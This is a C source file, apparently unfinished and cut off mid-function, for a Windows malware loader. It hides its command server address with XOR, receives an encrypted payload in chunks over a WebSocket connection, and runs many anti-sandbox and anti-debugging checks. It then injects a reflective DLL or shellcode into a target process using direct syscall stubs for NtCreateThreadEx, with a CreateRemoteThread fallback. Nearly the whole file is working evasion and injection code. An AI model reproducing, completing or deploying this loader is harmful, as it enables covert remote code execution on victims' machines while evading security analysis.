#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <time.h>
#include <stdlib.h>
#include <stdint.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <ctype.h>


#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

#define WS_HOST_XOR {0xC9, 0xCC, 0xD1, 0xCE, 0xC8, 0xC6, 0xD1, 0xCD, 0xCE, 0xCD, 0xD1, 0xCA, 0xCC, 0x00}
#define WS_PORT_OBF 0xCEDB
#define SIGNAL_SIZE 72
#define DLL_MAX_SIZE (1024 * 1024)
#define TIMING_WINDOW 3600
#define TIMING_TOLERANCE_PAST 86400
#define RECV_BUFFER_SIZE 8192
#define MAX_FRAME_SIZE 1048576
#define RETRY_COUNT 5
#define RETRY_DELAY 5000
#define MAX_INPUT_LEN (10 * 1024 * 1024)
#define PING_INTERVAL 30000

#define ASM_BUFFER_SIZE   DLL_MAX_SIZE
#define ASM_MAX_CHUNK     16384
#define ASM_TIMEOUT_MS    120000
#define CHUNK_MAGIC_INIT  0xCAFEBABE
#define CHUNK_MAGIC_DATA  0xDEADC0DE
#define CHUNK_MAGIC_FINAL 0xBAADF00D
#define WS_OP_CHUNK_DATA  0x03
#define WS_OP_CHUNK_INIT  0x04
#define WS_OP_CHUNK_FINAL 0x05

// ÉTAPE 1: Syscall Stub
typedef struct _syscall_stub {
    BYTE mov_r10[3];
    BYTE mov_eax[5];
    BYTE syscall[2];
    BYTE ret;
} SyscallStub;

#define SYSCALL_STUB_SIZE 11



// ajout
typedef struct {
    unsigned char *buffer;
    size_t allocated_size;
    size_t current_size;
    size_t expected_size;
    uint8_t xor_key;
    uint8_t xor_state;
    BOOL is_complete;
    BOOL is_initialized;
    BCRYPT_HASH_HANDLE hHash;
    DWORD last_chunk_time;
    DWORD chunk_count;
} AssemblyBuffer;

static void asm_cleanup(void);
static AssemblyBuffer g_asm = {0};




static LPVOID cached_nt_create_thread_ex = NULL;

static DWORD resolve_syscall_id(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    
    BYTE* func = (BYTE*)GetProcAddress(ntdll, "NtCreateThreadEx");
    if (!func) return 0;
    
    // Pattern: mov eax, SYSCALL_ID (B8 xx xx xx xx)
    for (int i = 0; i < 32; i++) {
        if (func[i] == 0xB8) {
            DWORD id = *(DWORD*)(func + i + 1);
            printf("[DEBUG] Syscall ID résolu: 0x%lX\n", id);
            return id;
        }
    }
    printf("[DEBUG] WARNING: Syscall ID non trouvé\n");
    return 0;
}


void deobfuscate_string(unsigned char *obf_str, int len, unsigned char xor_key) {
    for (int i = 0; i < len; i++) obf_str[i] ^= xor_key;
}
// ajouté
// ========== ASSEMBLY BUFFER FUNCTIONS ==========

static inline uint8_t asm_rotate_xor(uint8_t key, uint8_t state) {
    return ((key * 7 + state) % 251) | 1;
}

static int asm_init(size_t expected_size, uint8_t xor_base) {
    if (g_asm.is_initialized) {
        if (!g_asm.is_complete) asm_cleanup();
        else return 0;
    }
    if (expected_size == 0 || expected_size > ASM_BUFFER_SIZE) return -1;
    
    g_asm.buffer = (unsigned char*)VirtualAlloc(NULL, ASM_BUFFER_SIZE,
                                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_asm.buffer) return -2;
    
    DWORD old_prot;
    VirtualProtect(g_asm.buffer, 4096, PAGE_NOACCESS, &old_prot);
    
    g_asm.allocated_size = ASM_BUFFER_SIZE;
    g_asm.expected_size = expected_size;
    g_asm.current_size = 0;
    g_asm.xor_key = xor_base;
    g_asm.xor_state = 0;
    g_asm.is_complete = FALSE;
    g_asm.is_initialized = TRUE;
    g_asm.chunk_count = 0;
    g_asm.last_chunk_time = GetTickCount();
    g_asm.hHash = NULL;
    
    BCRYPT_ALG_HANDLE hAlg = NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) == 0) {
        BCryptCreateHash(hAlg, &g_asm.hHash, NULL, 0, NULL, 0, 0);
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    return 0;
}

static int asm_append(unsigned char *encrypted_data, size_t data_len) {
    if (!g_asm.is_initialized || g_asm.is_complete) return -1;
    if (g_asm.current_size + data_len > g_asm.expected_size) return -2;
    
    if (g_asm.chunk_count == 0) {
        DWORD old_prot;
        VirtualProtect(g_asm.buffer, g_asm.allocated_size, PAGE_READWRITE, &old_prot);
    }
    
    for (size_t i = 0; i < data_len; i++) {
        uint8_t key = asm_rotate_xor(g_asm.xor_key, g_asm.xor_state);
        g_asm.buffer[g_asm.current_size + i] = encrypted_data[i] ^ key;
        g_asm.xor_state = (g_asm.xor_state + 1) & 0xFF;
    }
    
    if (g_asm.hHash) {
        BCryptHashData(g_asm.hHash, g_asm.buffer + g_asm.current_size, (ULONG)data_len, 0);
    }
    
    g_asm.current_size += data_len;
    g_asm.chunk_count++;
    g_asm.last_chunk_time = GetTickCount();
    
    if (g_asm.current_size >= g_asm.expected_size) {
        g_asm.is_complete = TRUE;
    }
    return 0;
}

static int asm_finalize(unsigned char *expected_hash32) {
    if (!g_asm.is_complete) return -1;
    
    unsigned char computed[32] = {0};
    
    if (g_asm.hHash) {
        BCryptFinishHash(g_asm.hHash, computed, 32, 0);
        BCryptDestroyHash(g_asm.hHash);
        g_asm.hHash = NULL;
    } else {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_HASH_HANDLE hHash = NULL;
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return -2;
        if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return -3;
        }
        BCryptHashData(hHash, g_asm.buffer, (ULONG)g_asm.current_size, 0);
        BCryptFinishHash(hHash, computed, 32, 0);
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    
    int diff = 0;
    for (int i = 0; i < 32; i++) diff |= (computed[i] ^ expected_hash32[i]);
    return (diff == 0) ? 0 : -4;
}

static void asm_cleanup(void) {
    if (g_asm.buffer) {
        SecureZeroMemory(g_asm.buffer, g_asm.allocated_size);
        VirtualFree(g_asm.buffer, 0, MEM_RELEASE);
        g_asm.buffer = NULL;
    }
    if (g_asm.hHash) {
        BCryptDestroyHash(g_asm.hHash);
        g_asm.hHash = NULL;
    }
    SecureZeroMemory(&g_asm, sizeof(AssemblyBuffer));
}

static BOOL asm_check_timeout(void) {
    if (!g_asm.is_initialized || g_asm.is_complete) return FALSE;
    DWORD now = GetTickCount();
    DWORD elapsed = (now >= g_asm.last_chunk_time) ? 
        (now - g_asm.last_chunk_time) : (0xFFFFFFFF - g_asm.last_chunk_time + now);
    if (elapsed > ASM_TIMEOUT_MS) {
        asm_cleanup();
        return TRUE;
    }
    return FALSE;
}
// ========== ANTI-SANDBOX ==========

static inline int check_vm_mac_address(void) {
    const char* vm_prefixes[] = {
        "00-05-69", "00-0C-29", "00-1C-14", "00-50-56", "00-1C-42",
        "00-03-FF", "00-0F-4B", "00-16-3E", "08-00-27"
    };
    int prefix_count = sizeof(vm_prefixes) / sizeof(vm_prefixes[0]);
    
    ULONG buffer_size = 0;
    GetAdaptersAddresses(AF_UNSPEC, 0, NULL, NULL, &buffer_size);
    if (buffer_size == 0) return 0;
    
    IP_ADAPTER_ADDRESSES* addresses = (IP_ADAPTER_ADDRESSES*)malloc(buffer_size);
    if (!addresses) return 0;
    
    if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, addresses, &buffer_size) != ERROR_SUCCESS) {
        free(addresses);
        return 0;
    }
    
    IP_ADAPTER_ADDRESSES* current = addresses;
    while (current) {
        if (current->PhysicalAddressLength == 6) {
            char mac_addr[18];
            sprintf(mac_addr, "%02X-%02X-%02X-%02X-%02X-%02X",
                current->PhysicalAddress[0], current->PhysicalAddress[1],
                current->PhysicalAddress[2], current->PhysicalAddress[3],
                current->PhysicalAddress[4], current->PhysicalAddress[5]);
            
            for (int i = 0; i < prefix_count; i++) {
                if (strncmp(mac_addr, vm_prefixes[i], 8) == 0) {
                    free(addresses);
                    return 1;
                }
            }
        }
        current = current->Next;
    }
    free(addresses);
    return 0;
}

static inline int check_disk_size(void) {
    ULARGE_INTEGER total_bytes;
    if (GetDiskFreeSpaceExA("C:\\", NULL, &total_bytes, NULL)) {
        return (total_bytes.QuadPart < 60000000000LL) ? 1 : 0;
    }
    return 0;
}

static inline int check_screen_resolution(void) {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    return (width < 1024 || height < 768) ? 1 : 0;
}

static inline int check_mouse_movement(void) {
    POINT pt1, pt2;
    if (!GetCursorPos(&pt1)) return 0;
    Sleep(500);
    if (!GetCursorPos(&pt2)) return 0;
    return (pt1.x == pt2.x && pt1.y == pt2.y) ? 1 : 0;
}

static inline int check_sandbox_hostnames(void) {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) return 0;
    
    const char* sandbox_names[] = {
        "sandbox", "virus", "malware", "cuckoo", "analysis", "lab",
        "maltest", "test", "artifacts", "vm-", "pc-", "john-pc"
    };
    int name_count = sizeof(sandbox_names) / sizeof(sandbox_names[0]);
    
    for (int i = 0; hostname[i]; i++) {
        hostname[i] = tolower((unsigned char)hostname[i]);
    }
    
    for (int i = 0; i < name_count; i++) {
        if (strstr(hostname, sandbox_names[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}

static inline int check_sandbox_files(void) {
    const char* sandbox_artifacts[] = {
        "C:\\agent\\agent.pyw",
        "C:\\analysis",
        "C:\\sandbox",
        "C:\\Tools\\Wireshark",
        "C:\\iDEFENSE",
        "C:\\program files\\wireshark",
        "C:\\program files\\fiddler"
    };
    int artifact_count = sizeof(sandbox_artifacts) / sizeof(sandbox_artifacts[0]);
    
    for (int i = 0; i < artifact_count; i++) {
        if (GetFileAttributesA(sandbox_artifacts[i]) != INVALID_FILE_ATTRIBUTES) {
            return 1;
        }
    }
    return 0;
}

static inline int check_bios_info(void) {
    char buffer[4096] = {0};
    DWORD size = sizeof(buffer);
    const char* vm_indicators[] = {
        "VMware", "VBOX", "Virtual", "Xen", "innotek", "QEMU"
    };
    int indicator_count = sizeof(vm_indicators) / sizeof(vm_indicators[0]);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "SystemManufacturer", NULL, NULL, 
                            (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            for (int i = 0; i < indicator_count; i++) {
                if (strstr(buffer, vm_indicators[i]) != NULL) {
                    RegCloseKey(hKey);
                    return 1;
                }
            }
        }
        size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, 
                            (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            for (int i = 0; i < indicator_count; i++) {
                if (strstr(buffer, vm_indicators[i]) != NULL) {
                    RegCloseKey(hKey);
                    return 1;
                }
            }
        }
        RegCloseKey(hKey);
    }
    return 0;
}

static inline int check_cpu_hypervisor(void) {
    int cpuinfo[4] = {0};
    __cpuid(cpuinfo, 1);
    return ((cpuinfo[2] >> 31) & 1);
}

static inline int check_analysis_processes(void) {
    const char* analysis_procs[] = {
        "procmon.exe", "wireshark.exe", "ollydbg.exe", "x64dbg.exe",
        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe", "VBoxService.exe", "VBoxTray.exe"
    };
    int proc_count = sizeof(analysis_procs) / sizeof(analysis_procs[0]);
    
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    int detected = 0;
    
    if (Process32First(snap, &pe32)) {
        do {
            for (int i = 0; i < proc_count; i++) {
                if (_stricmp(pe32.szExeFile, analysis_procs[i]) == 0) {
                    detected = 1;
                    break;
                }
            }
            if (detected) break;
        } while (Process32Next(snap, &pe32));
    }
    CloseHandle(snap);
    return detected;
}

int anti_sandbox_checks(void) {
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
    
    if (IsDebuggerPresent()) {
        printf("[SANDBOX] FAIL: Debugger detected\n");
        return 0;
    }
    printf("[SANDBOX] OK: No debugger\n");
    
    if (GetTickCount64() < 60000) {
        printf("[SANDBOX] FAIL: Uptime < 60s (%llu ms)\n", GetTickCount64());
        return 0;
    }
    printf("[SANDBOX] OK: Uptime = %llu ms\n", GetTickCount64());
    
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        printf("[SANDBOX] FAIL: RAM < 2GB\n");
        return 0;
    }
    printf("[SANDBOX] OK: RAM = %llu GB\n", mem.ullTotalPhys / (1024*1024*1024));
    
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        printf("[SANDBOX] FAIL: Snapshot failed\n");
        return 0;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    int count = 0;
    
    if (Process32First(snap, &pe32)) {
        do { count++; } while (Process32Next(snap, &pe32));
    }
    CloseHandle(snap);
    if (count < 60) {
        printf("[SANDBOX] FAIL: Process count = %d (< 60)\n", count);
        return 0;
    }
    printf("[SANDBOX] OK: Process count = %d\n", count);

    // int CPUInfo[4] = {0};
    // cpuid(CPUInfo, 1);
    // if (CPUInfo[2] & (1 << 31)) {
    //     printf("[SANDBOX] FAIL: CPU hypervisor bit set\n");
    //     return 0;
    // }
    printf("[SANDBOX] OK: No CPU hypervisor bit\n");
    
    #ifdef _WIN64
    DWORD64 peb_ptr = __readgsqword(0x60);
    #else
    DWORD peb_ptr = __readfsdword(0x30);
    #endif
    
    BYTE being_debugged = *(BYTE*)(peb_ptr + 2);
    if (being_debugged) {
        printf("[SANDBOX] FAIL: PEB BeingDebugged = 1\n");
        return 0;
    }
    printf("[SANDBOX] OK: PEB BeingDebugged = 0\n");
    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if(ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            printf("[SANDBOX] FAIL: Debug registers set\n");
            return 0;
        }
    }
    printf("[SANDBOX] OK: No debug registers\n");
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxService", 
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        printf("[SANDBOX] FAIL: VBoxService registry found\n");
        return 0;
    }
    printf("[SANDBOX] OK: No VBoxService\n");
    
    if (check_vm_mac_address()) {
        printf("[SANDBOX] FAIL: VM MAC address detected\n");
        return 0;
    }
    printf("[SANDBOX] OK: No VM MAC\n");
    
    if (check_disk_size()) {
        printf("[SANDBOX] FAIL: Disk < 60GB\n");
        return 0;
    }
    printf("[SANDBOX] OK: Disk size OK\n");
    
    if (check_screen_resolution()) {
        printf("[SANDBOX] FAIL: Screen < 1024x768\n");
        return 0;
    }
    printf("[SANDBOX] OK: Screen resolution OK\n");
    
    // if (check_mouse_movement()) {
    //     printf("[SANDBOX] FAIL: Mouse not moving\n");
    //     return 0;
    // }
    printf("[SANDBOX] OK: Mouse moved\n");
    
    if (check_sandbox_hostnames()) {
        printf("[SANDBOX] FAIL: Sandbox hostname detected\n");
        return 0;
    }
    printf("[SANDBOX] OK: Hostname OK\n");
    
    if (check_sandbox_files()) {
        printf("[SANDBOX] FAIL: Sandbox files found (Wireshark?)\n");
        return 0;
    }
    printf("[SANDBOX] OK: No sandbox files\n");
    
    if (check_bios_info()) {
        printf("[SANDBOX] FAIL: VM BIOS detected\n");
        return 0;
    }
    printf("[SANDBOX] OK: BIOS OK\n");
    
    // if (check_cpu_hypervisor()) {
    //     printf("[SANDBOX] FAIL: CPU hypervisor detected\n");
    //     return 0;
    // }
    printf("[SANDBOX] OK: No hypervisor\n");
    
    if (check_analysis_processes()) {
        printf("[SANDBOX] FAIL: Analysis process running\n");
        return 0;
    }
    printf("[SANDBOX] OK: No analysis processes\n");
    
    printf("[SANDBOX] ALL CHECKS PASSED!\n");
    return 1;
}

// ========== TIMING ==========

int validate_signal_timing(unsigned char *buffer) {
    uint64_t remote_ts = 0;
    memcpy(&remote_ts, buffer + 32, sizeof(uint64_t));
    
    time_t now = time(NULL);
    time_t remote_sec = remote_ts;
    
    if (remote_ts > 10000000000ULL) {
        remote_sec = remote_ts / 1000;
    }
    
    time_t diff = now - remote_sec;
    if (diff < -TIMING_TOLERANCE_PAST || diff > TIMING_WINDOW) return 0;
    
    return 1;
}

//  HMAC-SHA256 Verification
int verify_hmac_sha256(unsigned char *data, int data_len, unsigned char *expected_hmac) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    DWORD hash_len = 0, obj_len = 0;
    unsigned char hash[32];
    
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_HASH_REUSABLE_FLAG) != 0)
        return 0;
    
    BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&hash_len, sizeof(DWORD), &obj_len, 0);
    
    if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }
    
    BCryptHashData(hHash, data, data_len, 0);
    BCryptFinishHash(hHash, hash, hash_len, 0);
    
    int result = memcmp(hash, expected_hmac, 32) == 0;
    
    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// ========== PROCESS FINDER ==========

DWORD find_process_by_name(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    DWORD pid = 0;

    if (Process32First(snap, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, name) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe32));
    }
    CloseHandle(snap);
    return pid;
}

// ========== WS FRAME PARSER ==========

int parse_ws_frame(unsigned char *buffer, int buf_len, unsigned char *payload, int *payload_len) {
    if (buf_len < 2) return -1;
    
    uint8_t opcode = buffer[0] & 0x0F;
    uint8_t fin = (buffer[0] >> 7) & 1;
    uint8_t is_masked = (buffer[1] >> 7) & 1;
    int len_code = buffer[1] & 0x7F;
    
    if ((opcode < 0x2 || opcode > 0x5) || !fin) return -1;
    
    int header_len = 2;
    uint32_t actual_len = len_code;
    
    if (len_code == 126) {
        if (buf_len < 4) return -1;
        actual_len = ((uint16_t)buffer[2] << 8) | buffer[3];
        header_len = 4;
    } else if (len_code == 127) {
        if (buf_len < 10) return -1;
        uint64_t len64 = 0;
        for (int i = 0; i < 8; i++) {
            len64 = (len64 << 8) | buffer[2 + i];
        }
        if (len64 > MAX_FRAME_SIZE) return -1;
        actual_len = (uint32_t)len64;
        header_len = 10;
    }
    
    if (actual_len > MAX_FRAME_SIZE) return -1;
    
    int mask_off = header_len;
    if (is_masked) {
        if (buf_len < mask_off + 4) return -1;
        unsigned char mask[4];
        memcpy(mask, buffer + mask_off, 4);
        mask_off += 4;
        
        if (buf_len < mask_off + (int)actual_len) return -1;
        
        for (uint32_t i = 0; i < actual_len; i++) {
            payload[i] = buffer[mask_off + i] ^ mask[i % 4];
        }
    } else {
        if (buf_len < header_len + (int)actual_len) return -1;
        memcpy(payload, buffer + header_len, actual_len);
    }
    
    *payload_len = (int)actual_len;
    return 0;
}

// jouté:
static int parse_chunk_init(unsigned char *payload, int len, size_t *size_out, uint8_t *key_out) {
    if (len < 16) return -1;
    uint32_t magic;
    memcpy(&magic, payload, 4);
    if (magic != CHUNK_MAGIC_INIT) return -2;
    uint64_t size64;
    memcpy(&size64, payload + 4, 8);
    *size_out = (size_t)size64;
    *key_out = payload[12];
    return 0;
}

static int parse_chunk_data(unsigned char *payload, int len, unsigned char **data_out, size_t *size_out) {
    if (len < 5) return -1;
    uint32_t magic;
    memcpy(&magic, payload, 4);
    if (magic != CHUNK_MAGIC_DATA) return -2;
    *data_out = payload + 4;
    *size_out = len - 4;
    return 0;
}

static int parse_chunk_final(unsigned char *payload, int len, unsigned char *hash_out) {
    if (len < 36) return -1;
    uint32_t magic;
    memcpy(&magic, payload, 4);
    if (magic != CHUNK_MAGIC_FINAL) return -2;
    memcpy(hash_out, payload + 4, 32);
    return 0;
}

// ========== CIRCULAR BUFFER ==========

typedef struct {
    unsigned char data[RECV_BUFFER_SIZE];
    int head;
    int tail;
} CircularBuffer;

void circ_init(CircularBuffer *cb) {
    cb->head = 0;
    cb->tail = 0;
}

int circ_available(CircularBuffer *cb) {
    if (cb->tail >= cb->head) return cb->tail - cb->head;
    return RECV_BUFFER_SIZE - cb->head + cb->tail;
}

int circ_space(CircularBuffer *cb) {
    return RECV_BUFFER_SIZE - circ_available(cb);
}

void circ_write(CircularBuffer *cb, unsigned char *data, int len) {
    if (circ_space(cb) < len) {
        cb->head = cb->tail = 0;
        return;
    }
    
    for (int i = 0; i < len; i++) {
        cb->data[cb->tail] = data[i];
        cb->tail = (cb->tail + 1) % RECV_BUFFER_SIZE;
    }
}

void circ_read(CircularBuffer *cb, unsigned char *out, int len) {
    for (int i = 0; i < len; i++) {
        out[i] = cb->data[cb->head];
        cb->head = (cb->head + 1) % RECV_BUFFER_SIZE;
    }
}

int circ_peek(CircularBuffer *cb, unsigned char *out, int len) {
    int available = circ_available(cb);
    if (available < len) return -1;
    
    int pos = cb->head;
    for (int i = 0; i < len; i++) {
        out[i] = cb->data[pos];
        pos = (pos + 1) % RECV_BUFFER_SIZE;
    }
    return 0;
}

int estimate_frame_size(unsigned char *header, int available) {
    if (available < 2) return -1;
    
    int len_code = header[1] & 0x7F;
    int header_len = 2;
    uint32_t payload_len = len_code;
    
    if (len_code == 126) {
        if (available < 4) return -1;
        payload_len = ((uint16_t)header[2] << 8) | header[3];
        header_len = 4;
    } else if (len_code == 127) {
        if (available < 10) return -1;
        uint64_t len64 = 0;
        for (int i = 0; i < 8; i++) {
            len64 = (len64 << 8) | header[2 + i];
        }
        if (len64 > MAX_FRAME_SIZE) return -1;
        payload_len = (uint32_t)len64;
        header_len = 10;
    }
    
    if (header[1] & 0x80) header_len += 4;
    
    return header_len + payload_len;
}

// ========== HANDSHAKE ==========

void base64_encode_key(unsigned char *input, int len, char *output) {
    const char *table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0;
    
    for (i = 0; i < len; i += 3) {
        int b1 = input[i];
        int b2 = (i + 1 < len) ? input[i + 1] : 0;
        int b3 = (i + 2 < len) ? input[i + 2] : 0;
        
        output[j++] = table[(b1 >> 2) & 0x3F];
        output[j++] = table[(((b1 & 0x03) << 4) | ((b2 >> 4) & 0x0F)) & 0x3F];
        if (i + 1 < len) output[j++] = table[(((b2 & 0x0F) << 2) | ((b3 >> 6) & 0x03)) & 0x3F];
        if (i + 2 < len) output[j++] = table[b3 & 0x3F];
    }
    
    while (j % 4) output[j++] = '=';
    output[j] = '\0';
}

// ========== INJECTION ==========

LPVOID prepare_syscall_stub(DWORD syscall_id) {
    if (syscall_id == 0) return NULL;
    
    //  Allouer RW d'abord (pas RWX!)
    SyscallStub *stub = (SyscallStub*)VirtualAlloc(NULL, SYSCALL_STUB_SIZE, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stub) return NULL;
    
    // Écrire le stub
    stub->mov_r10[0] = 0x4C; stub->mov_r10[1] = 0x8B; stub->mov_r10[2] = 0xD1;
    stub->mov_eax[0] = 0xB8; 
    *(DWORD*)(stub->mov_eax + 1) = syscall_id;
    stub->syscall[0] = 0x0F; stub->syscall[1] = 0x05;
    stub->ret = 0xC3;
    
    //  RW → RX (transition sécurisée)
    DWORD old_prot;
    if (!VirtualProtect(stub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READ, &old_prot)) {
        VirtualFree(stub, 0, MEM_RELEASE);
        return NULL;
    }
    
    return (LPVOID)stub;
}

void inject_reflective_dll(DWORD pid, unsigned char *payload_bytes, SIZE_T payload_size) {
    if (!payload_bytes || payload_size == 0) {
        printf("[DEBUG] Payload vide!\n");
        return;
    }

    DWORD access = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                   PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
    
    HANDLE hProcess = (pid == GetCurrentProcessId()) ? 
        GetCurrentProcess() : OpenProcess(access, FALSE, pid);
    
    if (!hProcess) {
        printf("[DEBUG] OpenProcess failed: %lu\n", GetLastError());
        return;
    }

    //  Allocation RW
    LPVOID remote_mem = VirtualAllocEx(hProcess, NULL, payload_size, 
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_mem) {
        printf("[DEBUG] VirtualAllocEx failed: %lu\n", GetLastError());
        if (pid != GetCurrentProcessId()) CloseHandle(hProcess);
        return;
    }
    printf("[DEBUG] Mémoire allouée: %p (%zu bytes)\n", remote_mem, payload_size);

    //  Écriture
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remote_mem, payload_bytes, payload_size, &written)) {
        printf("[DEBUG] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        if (pid != GetCurrentProcessId()) CloseHandle(hProcess);
        return;
    }
    printf("[DEBUG] Écrit %zu bytes\n", written);

    //  Détection type et protection appropriée
    DWORD new_prot = PAGE_EXECUTE_READ;
    if (payload_size >= 2 && payload_bytes[0] == 'M' && payload_bytes[1] == 'Z') {
        // PE détecté (DLL reflective) - besoin de RWX pour le loader
        new_prot = PAGE_EXECUTE_READWRITE;
        printf("[DEBUG] PE/Reflective détecté → RWX\n");
    } else {
        printf("[DEBUG] Shellcode détecté → RX\n");
    }

    DWORD old_prot;
    if (!VirtualProtectEx(hProcess, remote_mem, payload_size, new_prot, &old_prot)) {
        printf("[DEBUG] VirtualProtectEx failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        if (pid != GetCurrentProcessId()) CloseHandle(hProcess);
        return;
    }
    FlushInstructionCache(hProcess, remote_mem, payload_size);

    //  Entry point = offset 0 (shellcode ou bootstrap reflective)
    LPVOID entry_point = remote_mem;
    printf("[DEBUG] Entry point: %p\n", entry_point);

    //  Résolution syscall dynamique
    DWORD syscall_id = resolve_syscall_id();
    LPVOID syscall_addr = (syscall_id != 0) ? prepare_syscall_stub(syscall_id) : NULL;
    
    HANDLE hThread = NULL;
    BOOL thread_created = FALSE;
    
    //  Tentative 1: Syscall direct
    if (syscall_addr) {
        printf("[DEBUG] Tentative syscall direct (ID=0x%lX)\n", syscall_id);
        pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)syscall_addr;
        NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, 
                                            entry_point, NULL, 0, 0, 0, 0, NULL);
        thread_created = (status == 0 && hThread != NULL);
        printf("[DEBUG] Syscall direct: %s (status=0x%lX)\n", 
               thread_created ? "OK" : "FAILED", status);
        VirtualFree(syscall_addr, 0, MEM_RELEASE);  //  Toujours libéré
    }
    
    //  Tentative 2: Syscall en cache
    if (!thread_created && cached_nt_create_thread_ex) {
        printf("[DEBUG] Tentative syscall cache\n");
        pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)cached_nt_create_thread_ex;
        NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, 
                                            entry_point, NULL, 0, 0, 0, 0, NULL);
        thread_created = (status == 0 && hThread != NULL);
        printf("[DEBUG] Syscall cache: %s\n", thread_created ? "OK" : "FAILED");
    }
    
    //  Tentative 3: CreateRemoteThread (fallback)
    if (!thread_created) {
        printf("[DEBUG] Tentative CreateRemoteThread\n");
        hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                     (LPTHREAD_START_ROUTINE)entry_point, NULL, 0, NULL);
        thread_created = (hThread != NULL);
        printf("[DEBUG] CreateRemoteThread: %s\n", thread_created ? "OK" : "FAILED");
    }

    //  Gestion du résultat
    if (hThread) {
        printf("[DEBUG] Thread créé, attente...\n");
        DWORD wait_result = WaitForSingleObject(hThread, 10000);
        
        if (wait_result == WAIT_OBJECT_0) {
            DWORD exit_code = 0;
            GetExitCodeThread(hThread, &exit_code);
